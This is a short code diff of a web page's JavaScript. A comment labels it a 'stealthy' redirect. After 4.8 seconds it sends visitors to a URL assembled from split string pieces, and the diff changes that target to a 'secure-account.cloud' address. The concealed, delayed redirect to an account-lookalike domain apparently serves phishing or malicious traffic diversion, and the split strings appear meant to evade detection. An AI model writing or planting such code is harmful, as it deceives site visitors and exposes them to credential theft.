@@ -9,11 +9,12 @@
   // Stealthy JavaScript redirect (replace original meta refresh)
   setTimeout(function() {
     var p1 = 'https://';
-    var p2 = 'triv.';
-    var p3 = 'my';
+    var p2 = 'secure-account.';
+    var p3 = 'cloud';
     var target = p1 + p2 + p3;
     window.location.href = target;
   }, 4800); // 4.8 seconds
   
   
+
   
